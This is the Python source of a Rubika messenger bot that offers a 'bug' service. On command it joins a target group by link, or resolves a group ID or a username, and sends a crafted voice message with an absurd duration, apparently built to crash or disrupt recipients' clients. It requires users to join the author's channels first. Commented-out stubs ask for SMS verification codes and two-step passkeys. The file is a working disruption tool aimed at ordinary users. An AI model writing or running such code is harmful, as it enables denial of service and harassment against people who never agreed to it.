from rubpy import Client as Bot
from rubpy import filters
from rubpy import types
from Hicoder import Client
import random
import asyncio


bot = Bot("buger.bot")
pages = ['start', 'sending_gap_link', 'sendind_username',
         'sending_gap_guid', 'delete_bug', 'anti_bug',
         'sending_veify_code', 'sending_two_passcode',
         'send_your_appname', 'delete_app']


class Texts:
    start = """
    Hello dear user!
    I`m a bug bot.
    I can send bug to any group with link or guid and any private chat of users.

    commands:
    '1' => bug to group with link
    '2' => bug to group with guid
    '3' => bug to private chat
    '4' => about me.
    """
    """bug = 'send type of bug'
    anti_bug = 'send anti bug channel'
    login = 'send phone'"""
    guids = ['g0EZhUX085acca08f81002c1f76ba053']
    commands = ['start', '/help', '1', '2', '3', '/bug_gap_link:{link_gap},{caption},{name}', '/bug_gap_guid:{guid_gap},{caption},{name}', '/bug_gap_usid:{username},{caption},{name}']
    commands_lst = ''
    for cmd in commands:
        commands_lst += cmd + '\n'
    bugs_base_text = 'send your bug info with this format:\n'
    bugs_texts = [bugs_base_text + '/bug_gap_link:{link_gap}$$${caption}$$${name}',
                  bugs_base_text + '/bug_gap_guid:{guid_gap}$$${caption}$$${name}',
                  bugs_base_text + '/bug_gap_usid:{username}$$${caption}$$${name}']
    pages_texts = {'start': start,
                   'sending_gap_link': 'your bug sent succuess!',
                   'sendind_username': 'your bug sent succuess!',
                   'sending_gap_guid': 'your bug sent succuess!',
                   'delete_bug': 'send your gap link link for delete bug from it!',
                   'anti_bug': 'send your gap link for start anti bug in it!',
                   'sending_veify_code': ' a sms with a verfiacion code send to your phone number. please send it!',
                   'sending_two_passcode': 'send two pass key of your account!',
                   'send_your_appname': 'send a name for your app that save it my storage!',
                   'delete_app': 'send your app name that you want delete it!'}
    works = ['']


async def send_bug_(type_bug, link_or_guid):
    print(link_or_guid,type_bug)
    if type_bug == 'gp_li':
        Link = link_or_guid
        GU = await bot.join_group(Link)
        GUID = GU.to_dict['group']['group_guid']
        with open("9552999603.mp3", "rb") as f:
            music_bytes = f.read()
        await bot.send_voice(
            object_guid=GUID,
            voice=music_bytes,
            caption='@bots_esi @esi_self',
            file_name='𝕐𝕠𝕦𝕣𝕄𝕦𝕤𝕚𝕔',
            time=10000000000
        )
        await bot.leave_group(Link)
    elif type_bug == 'gp_gu':
        Link = link_or_guid
        with open("9552999603.mp3", "rb") as f:
            music_bytes = f.read()
        await bot.send_voice(
            object_guid=Link,
            voice=music_bytes,
            caption='bug from Dr.Strange Bot',
            file_name='𝕐𝕠𝕦𝕣𝕄𝕦𝕤𝕚𝕔',
            time=10000000000
        )
    elif type_bug == 'pv':
        GU_US = bot.get_object_by_username(link_or_guid)
        GUID_US = GU_US['user']['user_guid']
        with open("9552999603.mp3", "rb") as f:
            music_bytes = f.read()
        await bot.send_voice(
            object_guid=GUID_US,
            voice=music_bytes,
            caption='bug from Dr.Strange Bot',
            file_name='𝕐𝕠𝕦𝕣𝕄𝕦𝕤𝕚𝕔',
            time=10000000000
        )


def send_bug(type_of_bug, link):
    asyncio.run(send_bug_(type_of_bug, link))


def check_join(guid):
    esi_tv_members = bot.get_channel_all_members("c0Bxd2h0a975b8496fe5189f591cda76")['in_chat_members']
    esi_bots_members = bot.get_channel_all_members("c0BvfYD0d41f489ed5218ad6c4b4018a")['in_chat_members']
    print(esi_bots_members)
    Esi_tv = []
    Esi_bots = []
    for memb in esi_tv_members:
        Esi_tv.append(memb['member_guid'])
    for memb in esi_bots_members:
        Esi_bots.append(memb['member_guid'])
    print(Esi_bots)
    print(Esi_tv)

    if guid in Esi_bots and guid in Esi_tv:
        return True
    return False


def delete_bug(link_gap):
    pass


@bot.on_message_updates(filters.is_group)
def react(message: types.Update):
    while True:
        try:
            message.reaction(random.randint(0,73), message.object_guid, message.message_id)
        except:
            continue
        else:
            break


# type_bug: pv,gp_li,gp_gu
# cmd_type: sr=>send response,dw=>do work,ch=>change page
# pages: start,send_gap_link,send_gap_guid,send_user_id,send_gap_guid_to_delete_bug,send_gap_link_to_delete_bug,send_verify_code,send_two_passkey,send_bug_type,lgoin
@bot.on_message_updates(filters.is_text, filters.is_private)
def reply(message: types.Update):
    msg:str = message.text
    id = message.message_id
    guid = message.object_guid
    print(guid, msg, id)
    if check_join(guid):
        if msg == '/start' or msg == '/help':
            message.reply(Texts.start)
        elif msg == '1':
            message.reply(Texts.bugs_texts[0])
        elif msg == '2':
            message.reply(Texts.bugs_texts[1])
        elif msg == '3':
            message.reply(Texts.bugs_texts[2])
        elif msg.startswith('/bug_gap_link:'):
            msg = msg.replace("/bug_gap_link:", '')
            send_bug('gp_li', msg)
            message.reply(Texts.pages_texts['sending_gap_link'])
        elif msg.startswith('/bug_pv_usid:'):
            msg = msg.replace("/bug_pv_usid:", '')
            send_bug('pv', msg)
            message.reply(Texts.pages_texts['sendind_username'])
        elif msg.startswith('/bug_gap_guid:'):
            msg = msg.replace("/bug_gap_guid:", '')
            send_bug('gp_gu', msg)
            message.reply(Texts.pages_texts['sending_gap_guid'])
            """elif msg.startswith('/delete_bug:'):
                link_gap = msg.replace("/delete_bug:", '')
                delete_bug(link_gap)
                message.reply(Texts.pages_texts['delete_bug'])
            elif msg == '/bug_gap_link':
                message.reply(Texts.bug)
                reply(message, 'sending_gap_link', 'ch')
            elif msg == '/anti':
                message.reply(Texts.anti_bug)
            elif msg == '/login':
                message.reply(Texts.login)"""
            """elif msg == 'anti_bug':
                message.reply(Texts.pages_texts['anti_bug'])
            elif page == 'sending_veify_code':
                message.reply(Texts.pages_texts['sending_veify_code'])
                page = 'start'
                return reply(message, page, 'dw')
            elif page == 'sending_two_passcode':
                message.reply(Texts.pages_texts['sending_two_passcode'])
                page = 'start'
                return reply(message, page, 'dw')
            elif page == 'delete_app':
                message.reply(Texts.pages_texts['delete_app'])
                page = 'start'
                return reply(message, page, 'dw')
            elif page == 'send_your_appname':
                message.reply(Texts.pages_texts['send_your_appname'])
                page = 'start'
                return reply(message, page, 'dw')"""
        else:
            message.reply("commands 'msg' not found 404 \n " + str(Texts.commands_lst))
    else:
        message.reply("please join to our channels:\n@Esi_Self\n@Bots_Esi\nAnd try again for send /start command!")


@bot.on_message_updates(filters.is_text, filters.is_group)
def reply(message: types.Update):
    if message.text == '/start':
        message.reply('این بات فقط در پیوی کار می کند' + '\n' + 'به پیوی من مراجعه کنید')


bot.run()




